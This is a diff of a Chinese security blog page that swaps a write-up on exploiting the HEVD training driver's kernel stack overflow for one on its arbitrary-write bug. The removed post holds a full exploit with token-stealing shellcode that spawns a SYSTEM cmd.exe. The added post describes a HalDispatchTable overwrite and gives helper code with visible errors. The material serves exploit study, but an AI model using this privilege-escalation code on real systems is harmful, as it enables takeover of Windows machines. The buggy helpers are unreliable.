@@ -2,7 +2,7 @@
 <html lang="zh">
   <head>
     <title>
-        HEVD 栈溢出 - Ryze
+        HEVD 任意内存覆盖 - Ryze
       </title>
         <meta charset="utf-8">
     <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
@@ -20,9 +20,9 @@
     <meta http-equiv="window-target" content="_top" />
     
     
-    <meta name="description" content="源码分析 RtlCopyMemory 函数是一个 Windows API 函数，能将一块内存数据从一个地方复制到另一个地方。 存在漏洞的 107 行，Size未做验证，且由 Ring3 决定，所以存在内核栈溢出。" />
+    <meta name="description" content="代码分析 ArbitraryWrite.h 定义了两个指针 where、what ArbitraryWrite.c *(Where) = *(What) 意为 Where 指向的地址所保存的值 等于 What 指向的地址所保存的值，如果可以控制两个指针就可以做到任意" />
     <meta name="generator" content="Hugo 0.78.1 with theme pure" />
-    <title>HEVD 栈溢出 - Ryze</title>
+    <title>HEVD 任意内存覆盖 - Ryze</title>
     
     
     <link rel="stylesheet" href="https://ryze-t.github.io/css/style.min.5743fa7b2206cb1eb1d7532cda60d1ebf1e3ae4aac4077fc182a92c911e04e02.css">
@@ -30,24 +30,24 @@
     <link rel="stylesheet" href="https://cdn.staticfile.org/highlight.js/9.15.10/styles/github.min.css" async> 
     <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.css" async>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.css" async>
-    <meta property="og:title" content="HEVD 栈溢出" />
-<meta property="og:description" content="源码分析 RtlCopyMemory 函数是一个 Windows API 函数，能将一块内存数据从一个地方复制到另一个地方。 存在漏洞的 107 行，Size未做验证，且由 Ring3 决定，所以存在内核栈溢出。" />
+    <meta property="og:title" content="HEVD 任意内存覆盖" />
+<meta property="og:description" content="代码分析 ArbitraryWrite.h 定义了两个指针 where、what ArbitraryWrite.c *(Where) = *(What) 意为 Where 指向的地址所保存的值 等于 What 指向的地址所保存的值，如果可以控制两个指针就可以做到任意" />
 <meta property="og:type" content="article" />
-<meta property="og:url" content="https://ryze-t.github.io/2021/01/hevd-%E6%A0%88%E6%BA%A2%E5%87%BA/" />
-<meta property="article:published_time" content="2021-01-18T00:00:00+08:00" />
-<meta property="article:modified_time" content="2021-01-18T00:00:00+08:00" />
-<meta itemprop="name" content="HEVD 栈溢出">
-<meta itemprop="description" content="源码分析 RtlCopyMemory 函数是一个 Windows API 函数，能将一块内存数据从一个地方复制到另一个地方。 存在漏洞的 107 行，Size未做验证，且由 Ring3 决定，所以存在内核栈溢出。">
-<meta itemprop="datePublished" content="2021-01-18T00:00:00+08:00" />
-<meta itemprop="dateModified" content="2021-01-18T00:00:00+08:00" />
-<meta itemprop="wordCount" content="2235">
+<meta property="og:url" content="https://ryze-t.github.io/2021/01/hevd-%E4%BB%BB%E6%84%8F%E5%86%85%E5%AD%98%E8%A6%86%E7%9B%96/" />
+<meta property="article:published_time" content="2021-01-19T00:00:00+08:00" />
+<meta property="article:modified_time" content="2021-01-19T00:00:00+08:00" />
+<meta itemprop="name" content="HEVD 任意内存覆盖">
+<meta itemprop="description" content="代码分析 ArbitraryWrite.h 定义了两个指针 where、what ArbitraryWrite.c *(Where) = *(What) 意为 Where 指向的地址所保存的值 等于 What 指向的地址所保存的值，如果可以控制两个指针就可以做到任意">
+<meta itemprop="datePublished" content="2021-01-19T00:00:00+08:00" />
+<meta itemprop="dateModified" content="2021-01-19T00:00:00+08:00" />
+<meta itemprop="wordCount" content="959">
 
 
 
 <meta itemprop="keywords" content="Windows,HEVD," />
 <meta name="twitter:card" content="summary"/>
-<meta name="twitter:title" content="HEVD 栈溢出"/>
-<meta name="twitter:description" content="源码分析 RtlCopyMemory 函数是一个 Windows API 函数，能将一块内存数据从一个地方复制到另一个地方。 存在漏洞的 107 行，Size未做验证，且由 Ring3 决定，所以存在内核栈溢出。"/>
+<meta name="twitter:title" content="HEVD 任意内存覆盖"/>
+<meta name="twitter:description" content="代码分析 ArbitraryWrite.h 定义了两个指针 where、what ArbitraryWrite.c *(Where) = *(What) 意为 Where 指向的地址所保存的值 等于 What 指向的地址所保存的值，如果可以控制两个指针就可以做到任意"/>
 
     <!--[if lte IE 9]>
         <script src="https://cdnjs.cloudflare.com/ajax/libs/classlist/1.1.20170427/classList.min.js"></script>
@@ -269,8 +269,8 @@ function tagCloud(where, min, max) {
       <h1 itemprop="name">
   <a
     class="article-title"
-    href="/2021/01/hevd-%E6%A0%88%E6%BA%A2%E5%87%BA/"
-    >HEVD 栈溢出</a
+    href="/2021/01/hevd-%E4%BB%BB%E6%84%8F%E5%86%85%E5%AD%98%E8%A6%86%E7%9B%96/"
+    >HEVD 任意内存覆盖</a
   >
 </h1>
 
@@ -278,8 +278,8 @@ function tagCloud(where, min, max) {
         
 <span class="article-date">
   <i class="icon icon-calendar-check"></i>&nbsp;
-<a href="https://ryze-t.github.io/2021/01/hevd-%E6%A0%88%E6%BA%A2%E5%87%BA/" class="article-date">
-  <time datetime="2021-01-18 00:00:00 &#43;0800 CST" itemprop="datePublished">01-18</time>
+<a href="https://ryze-t.github.io/2021/01/hevd-%E4%BB%BB%E6%84%8F%E5%86%85%E5%AD%98%E8%A6%86%E7%9B%96/" class="article-date">
+  <time datetime="2021-01-19 00:00:00 &#43;0800 CST" itemprop="datePublished">01-18</time>
 </a>
 </span>
   
@@ -289,255 +289,121 @@ function tagCloud(where, min, max) {
     <a class="article-tag-link" href="/tags/hevd/"> HEVD </a>
   </span>
 
-        <span class="post-comment"><i class="icon icon-comment"></i>&nbsp;<a href="/2021/01/hevd-%E6%A0%88%E6%BA%A2%E5%87%BA/#comments"
+        <span class="post-comment"><i class="icon icon-comment"></i>&nbsp;<a href="/2021/01/hevd-%E4%BB%BB%E6%84%8F%E5%86%85%E5%AD%98%E8%A6%86%E7%9B%96/#comments"
             class="article-comment-link">评论</a></span>
-		<span class="post-wordcount hidden-xs" itemprop="wordCount">字数统计: 2235字</span>
-		<span class="post-readcount hidden-xs" itemprop="timeRequired">阅读时长: 5分 </span>
+		<span class="post-wordcount hidden-xs" itemprop="wordCount">字数统计: 959字</span>
+		<span class="post-readcount hidden-xs" itemprop="timeRequired">阅读时长: 2分 </span>
       </div>
     </div>
     <div class="article-entry marked-body js-toc-content" itemprop="articleBody">
-      <h2 id="源码分析">源码分析</h2>
-<p><img src="https://gitee.com/tboom_is_here/picture-bed/raw/master/uPic/image-20201109233410820-20210118233553728.png" alt="image-20201109233410820"></p>
-<p>RtlCopyMemory 函数是一个 Windows API 函数，能将一块内存数据从一个地方复制到另一个地方。</p>
-<p>存在漏洞的 107 行，Size未做验证，且由 Ring3 决定，所以存在内核栈溢出。</p>
-<h2 id="漏洞分析">漏洞分析</h2>
-<h3 id="ida-pro-打开驱动">IDA pro 打开驱动</h3>
-<p>找到 TriggerStackOverflow的方法有两种：通过 IOCTL 和 特定函数。</p>
-<h4 id="通过-ioctl">通过 IOCTL：</h4>
-<p>HEVD 的 IOCTL 通过 IrpDeviceIoCtlHandler 实现：</p>
-<p><img src="https://gitee.com/tboom_is_here/picture-bed/raw/master/uPic/image-20201111201709062-20210118233553834.png" alt="image-20201111201709062"></p>
-<p>当 eax = 0x222003h 时，程序调用 StackOverflow 模块：</p>
-<p><img src="https://gitee.com/tboom_is_here/picture-bed/raw/master/uPic/image-20201111202316880-20210118233554003.png" alt="image-20201111202316880"></p>
-<p>因此当 IOCTL = 0x222003h时，程序调用 StackOverflow 模块。</p>
-<h4 id="通过函数">通过函数：</h4>
-<p>找到内存拷贝函数 __memcpy，x 查看调用情况，找到 TriggerStackOverflow</p>
-<p><img src="https://gitee.com/tboom_is_here/picture-bed/raw/master/uPic/image-20201109234239865-20210118233554114.png" alt="image-20201109234239865"></p>
-<p>进入地址</p>
-<p>调用函数 ProbeForRead，此函数是用来判断这块内存是否为 Ring3 的内存，大小为 0x800h</p>
-<p><img src="https://gitee.com/tboom_is_here/picture-bed/raw/master/uPic/image-20201110101240480-20210118233554218.png" alt="image-20201110101240480"></p>
-<p>下方输出调试信息，也调用了 esi，即 KernelBuffer Size 为 0x800h：</p>
-<p><img src="https://gitee.com/tboom_is_here/picture-bed/raw/master/uPic/image-20201110101549236-20210118233554317.png" alt="image-20201110101549236"></p>
-<p>调用 __memcpy  的函数在模块开始处偏移 0x8F 处</p>
-<p><img src="https://gitee.com/tboom_is_here/picture-bed/raw/master/uPic/image-20201110001858912-20210118233554422.png" alt="image-20201110001858912"></p>
-<h3 id="在-windbg-中调试">在 windbg 中调试</h3>
-<p>在 TriggerStackOverflow 开始处、调用 __memcpy 处下断点</p>
-<pre><code>bu HEVD!TriggerStackOverflow
-bu HEVD!TriggerStackOverflow+0x8f
-</code></pre>
-<h4 id="第0处断点">第0处断点：</h4>
-<p><img src="https://gitee.com/tboom_is_here/picture-bed/raw/master/uPic/image-20201110091716749-20210118233554523.png" alt="image-20201110091716749"></p>
-<p>查看寄存器：</p>
-<p><img src="https://gitee.com/tboom_is_here/picture-bed/raw/master/uPic/image-20201110093801980-20210118233554625.png" alt="image-20201110093801980"></p>
-<p>esp中存储的是返回地址，即 0x980f7ad4</p>
-<h4 id="第1处断点">第1处断点：</h4>
-<p>调用 memcpy 函数</p>
-<p><img src="https://gitee.com/tboom_is_here/picture-bed/raw/master/uPic/image-20201110092947727-20210118233554712.png" alt="image-20201110092947727"></p>
-<p>查看寄存器：</p>
-<p><img src="https://gitee.com/tboom_is_here/picture-bed/raw/master/uPic/image-20201110093955694-20210118233554818.png" alt="image-20201110093955694"></p>
-<p>查看 esp ：</p>
-<p><img src="https://gitee.com/tboom_is_here/picture-bed/raw/master/uPic/image-20201110094445144-20210118233554917.png" alt="image-20201110094445144"></p>
-<p>调用函数前，会将参数依次 push，因此此处 esp 指向的 0x980f72b4 就是 memcpy 函数的第一个参数 KernelBuffer的地址。</p>
-<p><strong>此处利用栈溢出原理：通过利用 memcpy 函数，覆盖返回地址为shellcode地址，从而调用 shellcode</strong></p>
-<p>因此需要计算偏移，即  ：</p>
-<p>TriggerStackOverflow 返回地址（esp）- memcpy调用的第一个参数KernelBuffer（[esp]） = 0x820</p>
-<p><img src="https://gitee.com/tboom_is_here/picture-bed/raw/master/uPic/image-20201110095137463-20210118233555014.png" alt="image-20201110095137463"></p>
-<h2 id="漏洞利用">漏洞利用</h2>
-<p>根据分析所得的信息， KernelBuffer = 0x800h，KernelBuffer 到返回地址的偏移为 0x820h，因此，填充偏移 0x820为 shellcode 地址即可执行 shellcode</p>
-<h3 id="尝试">尝试</h3>
-<pre><code>#include &lt;stdio.h&gt;
-#include &lt;Windows.h&gt;
-#define STACKOVERFLOW  0x222003
+      <h2 id="代码分析">代码分析</h2>
+<h3 id="arbitrarywriteh">ArbitraryWrite.h</h3>
+<p><img src="https://gitee.com/tboom_is_here/picture-bed/raw/master/uPic/image-20201216115431590.png" alt="image-20201216115431590"></p>
+<p>定义了两个指针 where、what</p>
+<h3 id="arbitrarywritec">ArbitraryWrite.c</h3>
+<p><img src="https://gitee.com/tboom_is_here/picture-bed/raw/master/uPic/image-20201216115544443.png" alt="image-20201216115544443"></p>
+<p>*(Where) = *(What) 意为 Where 指向的地址所保存的值 等于 What 指向的地址所保存的值，如果可以控制两个指针就可以做到任意地址写入。</p>
+<p>安全代码中增加了 ProbeForRead/ProbeForWrite 函数校验，官网解释为：</p>
+<p><img src="https://gitee.com/tboom_is_here/picture-bed/raw/master/uPic/image-20201216172537579.png" alt="image-20201216172537579"></p>
+<p>即这个函数是用来检查用户模式的 buffer 是否在地址空间的用户区，且是否对齐，其实意思就是去检查这块 buffer 是否可读/可写</p>
+<p><img src="https://gitee.com/tboom_is_here/picture-bed/raw/master/uPic/image-20201216164237081.png" alt="image-20201216164237081"></p>
+<p>UserWriteWhatWhere = (PWRITE_WHAT_WHERE)IrpSp-&gt;Parameters.DeviceIoControl.Type3InputBuffer  提供了控制两个指针的机会，通过下方也调用了 TriggerArbitraryWrite</p>
+<h2 id="ida-分析">IDA 分析</h2>
+<p>通过 IrpDeviceIoCtlHandler 找到 ArbitraryWrite 的 IOCTL：</p>
+<p><img src="https://gitee.com/tboom_is_here/picture-bed/raw/master/uPic/image-20201216164015312.png" alt="image-20201216164015312"></p>
+<p>跟进去查看函数 TriggerArbitraryWrite：</p>
+<p><img src="https://gitee.com/tboom_is_here/picture-bed/raw/master/uPic/image-20201216164050565.png" alt="image-20201216164050565"></p>
+<p>和代码分析一致，漏洞点为 *v2 = *v1</p>
+<h2 id="利用分析">利用分析</h2>
+<p>利用过程应为：</p>
+<ul>
+<li>通过 IOCTL 控制两个指针，where 指针指向 shellcode 地址的地址， what 指针指向shellcode地址</li>
+<li>程序执行流执行到 where 指向的地址</li>
+</ul>
+<p>所以这里需要想办法控制程序执行流</p>
+<p><a href="https://rootkits.xyz/blog/2017/09/kernel-write-what-where/">rootkits</a> 的分析里提到</p>
+<blockquote>
+<p>The first step to exploit this vulnerability is to find some address in kernel space to overwrite safely and reliably, without crashing the machine. Luckily, there’s a rarely used function in the kernel <em>NtQueryIntervalProfile</em>, that calls another function <em>KeQueryIntervalProfile</em>, which again calls <em>HalDispatchTable+0x4</em>.</p>
+</blockquote>
+<p>即在内存空间中任意覆盖内存是很危险的，所以要找到一个安全稳定的覆盖点，这个点就是 NtQueryIntervalProfile &ndash;&gt; NtKeQueryIntervalProfile &ndash;&gt; HalDispatchTable+0x4</p>
+<p>在 windbg 中可以查看这个结构：</p>
+<p>NtQueryIntervalProfile+0x62 这个位置，81928ed6 会调用 KeQueryIntervalProfile</p>
+<p><img src="https://gitee.com/tboom_is_here/picture-bed/raw/master/uPic/image-20201216170746941.png" alt="image-20201216170746941"></p>
+<p>KeQueryIntervalProfile+0x23这个位置，818e7438 会调用 HalDispatchTable+0x4</p>
+<p><img src="https://gitee.com/tboom_is_here/picture-bed/raw/master/uPic/image-20201216171426478.png" alt="image-20201216171426478"></p>
+<p>当覆盖掉这个点后，调用 NtQueryIntervalProfile，程序就会执行到 shellcode 处。</p>
+<p>要想覆盖 HalDispatchTable+0x4 ，必须先找到 HalDispatchTable 在内核空间的准确地址，那么就需要以下几个步骤：</p>
+<ul>
+<li>找到 ntkrnlpa.exe 在内核空间的基地址</li>
+<li>找到 ntkrnlpa.exe 在用户空间的基地址，并计算出 HalDispatchTable+0x4 在用户空间的偏移</li>
+<li>通过偏移计算 HalDispatchTable+0x4 在内核中的地址</li>
+</ul>
+<p>这里涉及到几个函数：</p>
+<pre><code class="language-c">//检索每个设备驱动程序的加载位置
 
-int main()
+BOOL
+WINAPI
+EnumDeviceDrivers(
+    LPVOID *lpImageBase, //设备驱动程序的加载地址列表的数组。
+    DWORD cb,	// lpImageBase 大小
+    LPDWORD lpcbNeeded	// lpImageBaes 数组中返回的字节数
+    );  
+</code></pre>
+<pre><code class="language-c">//检索指定设备驱动程序的名称
+
+DWORD
+WINAPI
+GetDeviceDriverBaseNameA(
+    LPVOID ImageBase,	//设备驱动程序的加载地址。可以使用EnumDeviceDrivers函数来检索此值。
+    LPSTR lpBaseName,	
+    DWORD nSize	//lpBaseName缓冲区的大小
+    );
+</code></pre>
+<pre><code class="language-c">//加载动态库
+
+HMODULE LoadLibrary(
+		LPCTSTR lpFileName
+		);
+</code></pre>
+<pre><code class="language-c">//检索指定的动态链接库(DLL)中的输出库函数地址
+
+FARPROC GetProcAddress(
+		HMODULE hModule, // DLL模块句柄
+		LPCSTR lpProcName // 函数名
+);
+</code></pre>
+<p>结合起来完成上述过程的代码应为：</p>
+<pre><code class="language-c">LPVOID NtkrnlpaAddress()
 {
-	char buf[0x824];
-	DWORD bReturn = 0;
-	HANDLE hDevice;
-	hDevice = CreateFileA(&quot;\\\\.\\HackSysExtremeVulnerableDriver&quot;,  //打开的设备名称
-		GENERIC_READ | GENERIC_WRITE,		// 对所打开的设备可读可写
-		FILE_SHARE_READ | FILE_SHARE_WRITE,		//请求共享模式。对其属性或扩展属性的访问请求进行约束，必须与第二参数匹配
-		NULL,
-		OPEN_EXISTING,	//仅打开存在的设备
-		FILE_ATTRIBUTE_NORMAL | FILE_FLAG_OVERLAPPED,		//默认属性，允许对设备进行重叠操作
-		NULL
-	);
-	printf(&quot;Get Handle...\n&quot;);
-	if (hDevice == NULL || hDevice == INVALID_HANDLE_VALUE)		// 返回句柄为空或不可用
-	{
-		printf(&quot;Failed to get Handle...\n&quot;);
-		return 0;
-	}
-	memset(buf, 'T', 0x824);		//内存填充 0x824 个 T
-	printf(&quot;exploit...\n&quot;);
-	DeviceIoControl(hDevice,		//设备句柄
-		STACKOVERFLOW,		//操作控制码
-		buf,			//输入缓冲区的指针
-		0x824,		//输入缓冲区的大小，字节数
-		NULL,		//驱动程序返回给应用程序的数据缓冲区地址
-		0,			//驱动程序返回给应用程序的数据缓冲区大小，字节数
-		&amp;bReturn,	//驱动程序实际返回给应用程序的数据字节数地址
-		NULL);		//重叠操作
-}
-</code></pre>
-<p><img src="https://gitee.com/tboom_is_here/picture-bed/raw/master/uPic/image-20201111204134352-20210118233555116.png" alt="image-20201111204134352"></p>
-<p>EIP 和 EBP 都被覆盖，说明此时已经覆盖了 EIP 可以控制程序执行流程。</p>
-<h3 id="提权代码">提权代码</h3>
-<h4 id="windbg-下提权过程">windbg 下提权过程</h4>
-<h5 id="查看进程">查看进程</h5>
-<pre><code>!dml_proc 查看进程
-</code></pre>
-<p><!-- raw HTML omitted --></p>
-<pre><code>address 是EPROCESS（executive process block，进程执行块）的地址，记录该进程的关键信息
-PID 是 进程号，system 的进程号为 4
-</code></pre>
-<h5 id="查看-token-位置">查看 token 位置</h5>
-<pre><code>dt命令主要用来查看相关的变量，结构体等的信息
-</code></pre>
-<p><!-- raw HTML omitted --></p>
-<pre><code>查看 EPROCESS 类型结构，token 位于偏移 0xf8 处，结构为 _EX_FAST_REF
-</code></pre>
-<h5 id="查看-systemexe-和-cmdexe-token">查看 system.exe 和 cmd.exe token：</h5>
-<pre><code>nt指内核
-_EX_FAST_REF 指 token 的 结构
-因为 token 在 EPROCESS 结构偏移 f8 的位置，所以查看 token 时要加 f8
-</code></pre>
-<p><img src="https://gitee.com/tboom_is_here/picture-bed/raw/master/uPic/image-20201018162050253-20210118233555214.png" alt="image-20201018162050253"></p>
-<p><img src="https://gitee.com/tboom_is_here/picture-bed/raw/master/uPic/image-20201018162131252-20210118233555309.png" alt="image-20201018162131252"></p>
-<pre><code>system 进程 token 的值为 0x8ac01275
-cmd 进程 token 的值为 0xa2087036
-</code></pre>
-<h5 id="替换-token-以提权">替换 token 以提权</h5>
-<pre><code>ed 可以修改4字节内存值
-g 可以让系统继续执行
-</code></pre>
-<p><img src="https://gitee.com/tboom_is_here/picture-bed/raw/master/uPic/image-20201018164009611-20210118233555404.png" alt="image-20201018164009611"></p>
-<p>修改后让系统继续执行并输入 whoami：</p>
-<p><img src="https://gitee.com/tboom_is_here/picture-bed/raw/master/uPic/image-20201018164029958-20210118233555509.png" alt="image-20201018164029958"></p>
-<p>过程的关键在于如何找到 EPROCESS。</p>
-<p>x86 上，FS 段寄存器用于指向 TEB（环境进程块）和 KPCR（处理器控制区），其偏移 0x124 为当前线程的 KTHREAD，KTHREAD 结构的偏移0x50处为 KPROCESS 结构，KPROCESS 结构是 EPROCESS 结构的第一个字段，因此也定位到了 EPROCESS。</p>
-<p>再通过 EPROCESS 偏移 0xB8 处的双向进程链表、偏移 0xB4 处的进程标识符以及System进程的进程标识符 4 遍历链表匹配到 System 进程。</p>
-<p>最后将 system EPROCESS 结构偏移 0xF8 处的 token 替换 当前 cmd 的 token</p>
-<h4 id="汇编代码">汇编代码</h4>
-<pre><code>pushad
-mov eax, fs:[124h]				//将当前线程的 KTHREAD 地址存入 eax
-mov eax, [eax + 050h]			//将 KPROCESS 结构首地址存入 eax
-mov ecx, eax							//将 EPROCESS 结构首地址存入 ecx
-mov edx, 4								//将 system pid 4 存入 edx
-
-find_sys_pid :
-					 mov eax, [eax + 0b8h]			//将双向进程活动链表地址存入 eax
-					 sub eax, 0b8h							//双向链表遍历
-					 cmp[eax + 0b4h], edx				//比较进程 pid 是否为 4
-					 jnz find_sys_pid						//PID != 4 时循环执行
-
-					 mov edx, [eax + 0f8h]			//将 system 进程的 token 赋给 edx
-					 mov[ecx + 0f8h], edx				//将edx的值赋给当前线程的 token 
-					 popad
-</code></pre>
-<p>此处还需要考虑一个问题，堆栈平衡。</p>
-<p>程序在读写数据的时候是通过地址查找的,如果函数调用之前的堆栈与函数调用之后的堆栈不一致,就可能导致找不到数据或找到的数据错误,有可能会导致程序崩溃。</p>
-<p>所以要使用 IDA pro，查看驱动在未进行利用时，正常的执行情况。</p>
-<p>在上述找到 TriggerStackOverflow 后，在 IDA pro 中输入 x 查看调用情况：</p>
-<p><img src="https://gitee.com/tboom_is_here/picture-bed/raw/master/uPic/image-20201112193309199-20210118233555622.png" alt="image-20201112193309199"></p>
-<p>跟进：</p>
-<p><!-- raw HTML omitted --></p>
-<p>程序在最后调用结束后，需要执行 pop ebp 与 ret 8</p>
-<p>在函数调用过程中，还会有 3 个 push</p>
-<pre><code>push ebx
-push esi
-push edi
-</code></pre>
-<p>故最后的汇编应为：</p>
-<pre><code>pop edi
-pop esi
-pop ebx
-pushad
-mov eax, fs:[124h]				//将当前线程的 KTHREAD 地址存入 eax
-mov eax, [eax + 050h]			//将 KPROCESS 结构首地址存入 eax
-mov ecx, eax							//将 KPROCESS 结构首地址存入 ecx
-mov edx, 4								//将 system pid 4 存入 edx
-
-find_sys_pid :
-					 mov eax, [eax + 0b8h]			//将双向进程活动链表地址存入 eax
-					 sub eax, 0b8h							//双向链表遍历
-					 cmp[eax + 0b4h], edx				//比较进程 pid 是否为 4
-					 jnz find_sys_pid						//PID != 4 时循环执行
-
-					 mov edx, [eax + 0f8h]			//将 system 进程的 token 赋给 edx
-					 mov[ecx + 0f8h], edx				//将edx的值赋给当前线程的 token 
-					 popad
-					 pop ebp 
-					 ret 8
-</code></pre>
-<h3 id="exp">EXP</h3>
-<pre><code>#include &lt;stdio.h&gt;
-#include &lt;Windows.h&gt;
-#define STACKOVERFLOW  0x222003
-
-VOID ShellCode()
-{
-	__asm
-	{
-		pop    edi
-		pop    esi
-		pop    ebx
-		pushad
-		mov eax, fs:[124h]
-		mov eax, [eax + 050h]
-		mov ecx, eax
-		mov edx, 4
-
-		find_sys_pid :
-					 mov eax, [eax + 0b8h]
-					 sub eax, 0b8h
-					 cmp[eax + 0b4h], edx
-					 jnz find_sys_pid
-
-					 mov edx, [eax + 0f8h]
-					 mov[ecx + 0f8h], edx
-					 popad
-					 pop ebp
-					 ret 8
-	}
+  LPVOID lpImageBase[1024];
+  DWORD lpcbNeeded;
+  TCHAR lpfileName[1024];
+  EnumDeviceDrivers(lpImageBase, sizeof(lpImageBase), &amp;lpcbNeeded);
+  for(int i = 0; i &lt; 1024; i++ )
+  {
+    GetDeviceDriverBaseNameA(lpImageBase,lpfileName,100);
+    if (!strcmp(lpfileName,&quot;ntkrnlpa.exe &quot;))
+    {
+			return lpImageBase[i];
+    }
+  }
+  return NULL;
 }
 
-int main()
+DWORD32 GetHalAddress_4()
 {
-	char buf[0x824];
-	DWORD bReturn = 0;
-	HANDLE hDevice;
-	hDevice = CreateFileA(&quot;\\\\.\\HackSysExtremeVulnerableDriver&quot;,  //打开的设备名称
-		GENERIC_READ | GENERIC_WRITE,		// 对所打开的设备可读可写
-		FILE_SHARE_READ | FILE_SHARE_WRITE,		//请求共享模式。对其属性或扩展属性的访问请求进行约束，必须与第二参数匹配
-		NULL,
-		OPEN_EXISTING,	//仅打开存在的设备
-		FILE_ATTRIBUTE_NORMAL | FILE_FLAG_OVERLAPPED,		//默认属性，允许对设备进行重叠操作
-		NULL
-	);
-	printf(&quot;Get Handle...\n&quot;);
-	if (hDevice == NULL || hDevice == INVALID_HANDLE_VALUE)		// 返回句柄为空或不可用
-	{
-		printf(&quot;Failed to get Handle...\n&quot;);
-		return 0;
-	}
-	memset(buf, 'T', 0x824);		//内存填充 0x824 个 T
-	*(PDWORD)(buf + 0x820) = (DWORD)&amp;ShellCode;
-	printf(&quot;exploit...\n&quot;);
-	DeviceIoControl(hDevice,		//设备句柄
-		STACKOVERFLOW,		//操作控制码
-		buf,			//输入缓冲区的指针
-		0x824,		//输入缓冲区的大小，字节数
-		NULL,		//驱动程序返回给应用程序的数据缓冲区地址
-		0,			//驱动程序返回给应用程序的数据缓冲区大小，字节数
-		&amp;bReturn,	//驱动程序实际返回给应用程序的数据字节数地址
-		NULL);		//重叠操作
-	system(&quot;cmd.exe&quot;);
-	return 0;
+  PVOID pNtkrnlpaAdress = NtkrnlpaAddress();
+  HMODULE hUserSpaceAddress = loadlibrary(&quot;ntkrnlpa.exe&quot;);
+  PVOID pUserSpaceAddress = GetProcAddress(hUserSpaceAddress, &quot;HalDispatchTable&quot;);
+  DWORD32 hal_4 = (DWORD32)pNtkrnlpaAddress + ((DWORD32)pUserSpaceAddress - (DWORD32)hUserSpaceAddress) + 0x4;
+  return hal_4;
 }
 </code></pre>
-<h3 id="结果">结果</h3>
-<p><img src="https://gitee.com/tboom_is_here/picture-bed/raw/master/uPic/image-20201119230852763-20210118233555729.png" alt="image-20201119230852763"></p>
-<h2 id="参考">参考</h2>
+<p>再调用一次 NtQueryIntervalProfile 即可触发shellcode</p>
+<p>这里需要先定义一下，查看函数原型：</p>
+<p><img src="https://gitee.com/tboom_is_here/picture-bed/raw/master/uPic/image-20201218210122516.png" alt="image-20201218210122516"></p>
+<h2 id="exp">EXP</h2>
+<p>参考  <a href="https://github.com/ThunderJie/Windows-Kernel-Exploit/blob/master/HEVD/ArbitraryOverwrite/ArbitraryOverwrite/test.c">Thunder J‘s EXP</a></p>
 
     </div>
     <div class="article-footer">
@@ -545,7 +411,7 @@ int main()
   <ul class="post-copyright list-unstyled">
     <li class="post-copyright-link hidden-xs">
       <strong>本文链接: </strong>
-      <a href="https://ryze-t.github.io/2021/01/hevd-%E6%A0%88%E6%BA%A2%E5%87%BA/" title="HEVD 栈溢出" target="_blank" rel="external">https://ryze-t.github.io/2021/01/hevd-%E6%A0%88%E6%BA%A2%E5%87%BA/</a>
+      <a href="https://ryze-t.github.io/2021/01/hevd-%E4%BB%BB%E6%84%8F%E5%86%85%E5%AD%98%E8%A6%86%E7%9B%96/" title="HEVD 任意内存覆盖" target="_blank" rel="external">https://ryze-t.github.io/2021/01/hevd-%E4%BB%BB%E6%84%8F%E5%86%85%E5%AD%98%E8%A6%86%E7%9B%96/</a>
     </li>
     <li class="post-copyright-license">
       <strong>License: </strong>
@@ -578,9 +444,14 @@ int main()
 </div><nav class="bar bar-footer clearfix" data-stick-bottom>
     <div class="bar-inner">
         <ul class="pager pull-left">
+            <li class="prev">
+                <a href="https://ryze-t.github.io/about/" title="About"><i
+                        class="icon icon-angle-left"
+                        aria-hidden="true"></i><span>&nbsp;&nbsp;下一篇</span></a>
+            </li>
             <li class="next">
-                <a href="https://ryze-t.github.io/about/"
-                    title="About"><span>上一篇&nbsp;&nbsp;</span><i
+                <a href="https://ryze-t.github.io/2021/01/hevd-uaf/"
+                    title="HEVD UAF"><span>上一篇&nbsp;&nbsp;</span><i
                         class="icon icon-angle-right" aria-hidden="true"></i></a>
             </li>
             
